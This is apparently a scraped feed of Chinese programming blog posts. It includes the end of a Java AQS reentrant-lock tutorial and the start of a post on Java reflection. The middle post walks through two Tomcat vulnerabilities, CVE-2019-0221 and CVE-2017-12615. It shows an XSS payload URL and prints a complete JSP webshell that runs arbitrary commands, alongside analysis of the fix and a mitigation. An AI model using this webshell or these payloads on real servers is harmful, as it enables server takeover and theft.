            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (Thread.currentThread() == getExclusiveOwnerThread()) {&lt;span&gt;//&lt;/span&gt;&lt;span&gt;锁被多次获取&lt;/span&gt;
                setState(getState() + 1);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;对获取锁的次数累加&lt;/span&gt;
                &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
        }

        @Override
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; tryRelease(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; arg) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (Thread.currentThread() !=&lt;span&gt; getExclusiveOwnerThread()) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; IllegalMonitorStateException();
            }
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (getState() == 0&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; IllegalMonitorStateException();
            }
            setState(getState() &lt;/span&gt;- 1&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (getState() == 0&lt;span&gt;) {
                setExclusiveOwnerThread(&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
        }

        @Override
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isHeldExclusively() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; getState() &amp;gt; 0&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
         * 返回一个Condition，每个condition都包含了一个condition队列
         * 这是能够唤醒指定线程的关键
         &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
        Condition newCondition() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ConditionObject();
        }
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;仅需要将操作代理到Sync上，调用AQS模板方法&lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Sync sync = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Sync();

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;*
     * 调用AQS的模板方法acquire(int arg)
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; lock() {
        System.out.println(Thread.currentThread().getName() &lt;/span&gt;+ &quot; 准备获取锁&quot;&lt;span&gt;);
        sync.acquire(&lt;/span&gt;1&lt;span&gt;);
        System.out.println(Thread.currentThread().getName() &lt;/span&gt;+ &quot; 已经获取到锁&quot;&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; tryLock() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; sync.tryAcquire(1&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;*
     * 调用AQS的模板方法release(int arg)
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; unlock() {
        System.out.println(Thread.currentThread().getName() &lt;/span&gt;+ &quot; 准备释放锁&quot;&lt;span&gt;);
        sync.release(&lt;/span&gt;1&lt;span&gt;);
        System.out.println(Thread.currentThread().getName() &lt;/span&gt;+ &quot; 已经释放锁&quot;&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Condition newCondition() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; sync.newCondition();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isLocked() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; sync.isHeldExclusively();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; hasQueuedThreads() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; sync.hasQueuedThreads();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; lockInterruptibly() &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; InterruptedException {
        sync.acquireInterruptibly(&lt;/span&gt;1&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; tryLock(&lt;span&gt;long&lt;/span&gt; timeout, TimeUnit unit) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; InterruptedException {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; sync.tryAcquireNanos(1&lt;span&gt;, unit.toNanos(timeout));
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;测试类：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.concurrent.locks.Lock;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Test {
    &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Lock lock = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; MyReentrantLock();

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * 递归获取锁
     *
     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; deep 递归深度
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; reenter(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; deep) {
        lock.lock();
        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
            System.out.println(Thread.currentThread().getName() &lt;/span&gt;+ &quot;:递归深度:&quot; +&lt;span&gt; deep);
            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; currentDeep = deep - 1&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (currentDeep == 0&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
            } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                reenter(currentDeep);
            }
        } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
            lock.unlock();
        }
    }

    &lt;/span&gt;&lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; WorkerThread &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; Thread {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
            reenter(&lt;/span&gt;3&lt;span&gt;);
        }
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; main(String[] args) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 启动2个子线程去争抢锁&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; 2; i++&lt;span&gt;) {
            Thread thread &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; WorkerThread();
            thread.start();
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;从程序输出可以看到，利用AQS，我们自定义的MyReentrantLock实现了可重入独占锁的功能。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/612509/202003/612509-20200321182214247-778214178.png&quot; alt=&quot;&quot; width=&quot;362&quot; height=&quot;325&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt;7、结语&lt;/span&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;　　本次就分享这么多内容，希望大家看了有收获。下一篇内容中会介绍Java线程池相关知识点，阅读过程中如发现描述有误，请指出，谢谢。&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Mon, 23 Mar 2020 00:55:00 +0000</pubDate>
<dc:creator>白我少年头</dc:creator>
<og:description>本次内容主要介绍AQS、AQS的设计及使用、ReentrantLock、ReentrantReadWriteLock以及手写一个可重入独占锁 1、什么是AQS？ AQS，队列同步器AbstractQu</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/hongshaodian/p/12452136.html</dc:identifier>
</item>
<item>
<title>我成功攻击了Tomcat服务器之后 - 码大叔</title>
<link>http://www.cnblogs.com/madashu/p/12550149.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/madashu/p/12550149.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi0yMGM2NWEwMDNlMzFjNWY0LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;Tomcat是一个开源的轻量级Web应用服务器，在我们平常工作过程中接触得非常多。代码也非常经典，很多人为了提升自己的技术也会去阅读学习Tomcat的源码。但正如著名诗人李白所说的：世界上本没有漏洞，使用的人多了，也就发现了漏洞。比如今年的2月份就爆出了存在文件包含漏洞。今天我们选择&lt;strong&gt;两个&lt;/strong&gt;比较直观的Tomcat漏洞去&lt;strong&gt;模拟整个漏洞被攻击的过程，以及漏洞为什么会产生，Tomcat大神们又是如何应对的。&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;一、ssi技术说明&quot;&gt;一、SSI技术说明&lt;/h2&gt;
&lt;p&gt;首先演示的漏洞和Tomcat的SSI功能有关，SSI是什么&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;SSI技术，也叫作Serve Side Includes，SSI（服务器端包含）是放置在HTML页面中的指令，并在服务页面时在服务器上对其进行评估。它们使您可以将动态生成的内容添加到现有的HTML页面，而不必通过CGI程序或其他动态技术来提供整个页面。使用SSI技术文件默认的后缀名为.shtml；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;举例：我们可以将指令放置到现有的HTML页面中，例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;!--#echo var=&quot;DATE_LOCAL&quot; --&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当该页面被执行时，将会显示如下结果&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;Sunday, 22-March-2020 18:28:54 GMT
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;SSI最常见的用途之一：输出CGI程序的结果，例如``命中计数器''。关于该技术更为详细的说明参见：&lt;a href=&quot;http://httpd.apache.org/docs/current/howto/ssi.html&quot;&gt;http://httpd.apache.org/docs/current/howto/ssi.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;二、为tomcat开启ssi&quot;&gt;二、为Tomcat开启SSI&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;准备好JRE、tomcat环境，我选择的是“apache-tomcat-9.0.10” （该漏洞受影响的版本有：Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39 and 7.0.0 to 7.0.93 ）&lt;/li&gt;
&lt;li&gt;修改conf/context.xml第19行，开启权限&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code&gt;&amp;lt;Context privileged=&quot;true&quot;&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;修改conf\web.xml，开启SSI Servlet。该段代码默认是被注释掉的，我们删除注释即可，代码在310-322行。&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code&gt;&amp;lt;servlet&amp;gt;
        &amp;lt;servlet-name&amp;gt;ssi&amp;lt;/servlet-name&amp;gt;
        &amp;lt;servlet-class&amp;gt;
          org.apache.catalina.ssi.SSIServlet
        &amp;lt;/servlet-class&amp;gt;
        &amp;lt;init-param&amp;gt;
          &amp;lt;param-name&amp;gt;buffered&amp;lt;/param-name&amp;gt;
          &amp;lt;param-value&amp;gt;1&amp;lt;/param-value&amp;gt;
        &amp;lt;/init-param&amp;gt;
        &amp;lt;init-param&amp;gt;
          &amp;lt;param-name&amp;gt;debug&amp;lt;/param-name&amp;gt;
          &amp;lt;param-value&amp;gt;0&amp;lt;/param-value&amp;gt;
        &amp;lt;/init-param&amp;gt;
        &amp;lt;init-param&amp;gt;
          &amp;lt;param-name&amp;gt;expires&amp;lt;/param-name&amp;gt;
          &amp;lt;param-value&amp;gt;666&amp;lt;/param-value&amp;gt;
        &amp;lt;/init-param&amp;gt;
        &amp;lt;init-param&amp;gt;
          &amp;lt;param-name&amp;gt;isVirtualWebappRelative&amp;lt;/param-name&amp;gt;
          &amp;lt;param-value&amp;gt;false&amp;lt;/param-value&amp;gt;
        &amp;lt;/init-param&amp;gt;
        &amp;lt;load-on-startup&amp;gt;4&amp;lt;/load-on-startup&amp;gt;
    &amp;lt;/servlet&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;去掉关于ssi配置的注释 422-425行&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  &amp;lt;servlet-mapping&amp;gt;
        &amp;lt;servlet-name&amp;gt;ssi&amp;lt;/servlet-name&amp;gt;
        &amp;lt;url-pattern&amp;gt;*.shtml&amp;lt;/url-pattern&amp;gt;
    &amp;lt;/servlet-mapping&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;4&quot;&gt;&lt;li&gt;在根目录下添加madashu_env.shtml（习惯性命名为printEnv.shtml）文件，位于webapps/ROOT/ssi/&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;&amp;lt;body&amp;gt;
Echo: &amp;lt;!--#echo var=&quot;QUERY_STRING_UNESCAPED&quot; --&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;
Env: &amp;lt;!--#printenv --&amp;gt;
&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;5&quot;&gt;&lt;li&gt;启动Tomcat即可&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;三、发起攻击&quot;&gt;三、发起攻击&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;我们输入以下url看下效果&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code&gt;http://localhost:8080/ssi/madashu_env.shtml?%3Cbr/%3E%3Cbr/%3E%3Ch1%3EHello%20Tomcat%EF%BC%8C%E7%A0%81%E5%A4%A7%E5%8F%94%E5%88%B0%E6%AD%A4%E4%B8%80%E6%B8%B8%3C/h1%3E%3Cbr/%3E%3Cbr/%3E
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi03OGUyOTQ3NGVlNzIyNjY0LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;2. XSS注入&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;http://localhost:8080/ssi/madashu_env.shtml?%3Cscript%3Ealert(%27Hello%20Tomcat%EF%BC%8C%E7%A0%81%E5%A4%A7%E5%8F%94%E5%88%B0%E6%AD%A4%E4%B8%80%E6%B8%B8%27)%3C/script%3E
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;攻击成功，页面展示如下。&lt;br/&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi1iMWQyYjM3M2M2ZWNkMzQyLnBuZw?x-oss-process=image/format,png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;通过这种方式我们使用户加载并执行攻击者恶意制造的网页程序，攻击者还可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。&lt;/p&gt;
&lt;h2 id=&quot;四、源码分析&quot;&gt;四、源码分析&lt;/h2&gt;
&lt;p&gt;漏洞产生后，Tomcat大神们迅速修复了该漏洞，我们从Github上找到当时的代码修复提交记录：&lt;a href=&quot;https://github.com/apache/tomcat/commit/15fcd166ea2c1bb79e8541b8e1a43da9c452ceea&quot;&gt;点击查看commit&lt;/a&gt;&lt;br/&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi01M2YwZGE3ZmE2OTk4MTk4LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;说真的，当时看到这段修复代码我是惊呆了，&lt;strong&gt;这是什么骚操作！！！“entity”又是什么鬼！！！&lt;/strong&gt;&lt;br/&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi1lYzgzNzc1N2RkMmNlM2FkLnBuZw?x-oss-process=image/format,png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;于是接下往下翻代码&lt;br/&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi0xZWY0ZDczYjBmN2U1YTMzLnBuZw?x-oss-process=image/format,png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;这个地方将我们输入的变量值直接输出到了网页，很明显刚刚的entity应该是进行了转码。我们找到SSIMediator.java文件，路径&lt;code&gt;org.apache.catalina.ssi. SSIMediator&lt;/code&gt;&lt;br/&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi1lNWM3NGI5ODY3NGEwMzU2LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi02MDI1ZDE4NzBmMWMxYjJiLnBuZw?x-oss-process=image/format,png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi05YzAxZjY2YTA2YzhkZWZhLnBuZw?x-oss-process=image/format,png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;这样我们一下子就明白过来了，当发现是“entity”编码，会将输入的内容进行Escape，从而避免了XSS。&lt;br/&gt;估计大神们当时也是紧急出了个hotfix版本，直接把参数写死成“entity”。还有作为Web服务器，**大神们竟然也会犯这么低级别的错误，所以这也解释了为什么不存在0Bug的系统，哈哈！**去翻看最新的&lt;code&gt;SSIPrintenv.java&lt;/code&gt;文件，已经把“entity”定义成常量了，这才专业嘛！&lt;br/&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi1kYTdiMjllNTU1ZmVlYjgxLnBuZw?x-oss-process=image/format,png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;p&gt;接下来再简单演示下远程代码执行漏洞，&lt;strong&gt;该漏洞为高危漏洞，即使是非默认配置，但是一旦存在漏洞，那么攻击者可以成功上传 Webshell，并控制服务器。&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;通过put方式上传文件，请求进行中时进行拦截：&lt;br/&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi01MTgyZGExMTZjNGMxODk3LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;image.png&quot;/&gt;&lt;/li&gt;
&lt;li&gt;生成恶意文件，取名叫&lt;code&gt;jiansheng.jsp&lt;/code&gt;&lt;br/&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi0yNGZlNWFjOTEyMTVmYTZlLnBuZw?x-oss-process=image/format,png&quot; alt=&quot;image.png&quot;/&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code&gt;&amp;lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&amp;gt;&amp;lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
+&quot;\\n&quot;);}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%&amp;gt;&amp;lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;amp;&amp;amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;))){out.println(&quot;&amp;lt;pre&amp;gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&amp;lt;/pre&amp;gt;&quot;);}else{out.println(&quot;:-)&quot;);}%&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;远程上传成功，接下来就可以愉快地在这个不属于我们自己的tomcat里玩耍了&lt;br/&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi00YWI3OTViZmZlYjFjMWQ4LnBuZw?x-oss-process=image/format,png&quot; alt=&quot;image.png&quot;/&gt;&lt;/li&gt;
&lt;li&gt;整个代码也是比较简单的，可以翻看&lt;code&gt;JspServlet.java&lt;/code&gt;，这里就不做演示了。&lt;br/&gt;**说明：**该漏洞影响范围非常广，从 5.x 到 9.x 全部中枪。最好的解决方式是将 conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true。&lt;/li&gt;
&lt;/ol&gt;&lt;hr/&gt;&lt;p&gt;【&lt;strong&gt;结语&lt;/strong&gt;】兴趣是最好的老师，我们通过去看大佬们掉过的坑，写过的代码，站在巨人的肩膀人可以更快速地提升自己。有兴趣的小伙伴可以去看看Tomcat已爆出的漏洞：&lt;br/&gt;&lt;a href=&quot;http://tomcat.apache.org/security-9.html&quot;&gt;http://tomcat.apache.org/security-9.html&lt;/a&gt;&lt;br/&gt;本次演示的两个漏洞分别是CVE-2019-0221，CVE-2017-12615。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;往期推荐&lt;/strong&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI0OTg4NDQ1Mg==&amp;amp;mid=2247483753&amp;amp;idx=1&amp;amp;sn=0dd77f0cb39f5e83d84553bb04944471&amp;amp;chksm=e98bfb22defc723400c97baa8b28c4fa4ac41b3975e2ccd6cfc4eed5a0474a22f16284256823&amp;amp;scene=21#wechat_redirect&quot;&gt;AI学习笔记：特征工程&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI0OTg4NDQ1Mg==&amp;amp;mid=2247483738&amp;amp;idx=1&amp;amp;sn=724928da250d1369e119646c19bb81c6&amp;amp;chksm=e98bfb11defc7207329c94d67ffe84d8a65ec3af1d3fce3d2d7bb4c161190028b69edbe285e6&amp;amp;scene=21#wechat_redirect&quot;&gt;从千万级数据查询来聊一聊索引结构和数据库原理&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI0OTg4NDQ1Mg==&amp;amp;mid=2247483733&amp;amp;idx=1&amp;amp;sn=affb9c72b18c2715e84c73e7d8fa65b7&amp;amp;chksm=e98bfb1edefc72081881a690ee731b3a35fb5b7d515ca2db1b91eed5315d7efd62df51f9f36c&amp;amp;scene=21#wechat_redirect&quot;&gt;AI学习笔记（一）：人工智能与机器学习概述&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI0OTg4NDQ1Mg==&amp;amp;mid=2247483717&amp;amp;idx=1&amp;amp;sn=a185f587ea878e7813073fc37c77ddb0&amp;amp;chksm=e98bfb0edefc7218d7cda952bb03e281791b904d6c51edc878b40995c0753c24e1c09a8c79a6&amp;amp;scene=21#wechat_redirect&quot;&gt;史上最强的Java堆内缓存框架，不接受反驳（附源码）&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=MzI0OTg4NDQ1Mg==&amp;amp;mid=2247483688&amp;amp;idx=1&amp;amp;sn=48da3987aa1cfe16b621944fa4a0cdfc&amp;amp;chksm=e98bfb63defc72752c4f0b98312820a3ae0b74defa01a887c26bf2ff1b5b5ede6b5b34c08263&amp;amp;scene=21#wechat_redirect&quot;&gt;SpringCloud第二代实战系列（一）：使用Nacos实现服务注册与发现&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;感谢各位大佬关注公众号“码大叔”，我们一起交流学习！&lt;br/&gt;&lt;strong&gt;微信公众号：码大叔&lt;/strong&gt; 十年戎“码”，老“叔”开花&lt;br/&gt;&lt;img src=&quot;https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8xOTU4NzAzMi1iYThiNGRmMDkzMDgyZjdhLnBuZw?x-oss-process=image/format,png&quot; width=&quot;200&quot; height=&quot;200&quot; div=&quot;&quot; align=&quot;left&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 23 Mar 2020 00:53:00 +0000</pubDate>
<dc:creator>码大叔</dc:creator>
<og:description>Tomcat是一个开源的轻量级Web应用服务器，在我们平常工作过程中接触得非常多。代码也非常经典，很多人为了提升自己的技术也会去阅读学习Tomcat的源码。但正如著名诗人李白所说的：世界上本没有漏洞，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/madashu/p/12550149.html</dc:identifier>
</item>
<item>
<title>【Java】反射调用与面向对象结合使用产生的惊艳 - 编程新说(李新杰)</title>
<link>http://www.cnblogs.com/lixinjie/p/combine-reflect-and-oo-in-java.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lixinjie/p/combine-reflect-and-oo-in-java.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;缘起&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;我在看Spring的源码时，发现了一个隐藏的问题，就是父类方法（Method）在子类实例上的反射（Reflect）调用。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;初次看到，感觉有些奇特，因为父类方法可能是抽象的或私有的，但我没有去怀疑什么，这可是Spring的源码，肯定不会有错。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;不过我去做了测试，发现确实是正确的，那一瞬间竟然给我了一丝的惊艳。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;这其实是面向对象（继承与重写，即多态）和反射结合的产物。&lt;/span&gt;&lt;span&gt;下面先来看测试，最后再进行总结。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;友情提示&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;：&lt;/span&gt;&lt;span&gt;测试内容较多，不过还是值得一看。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&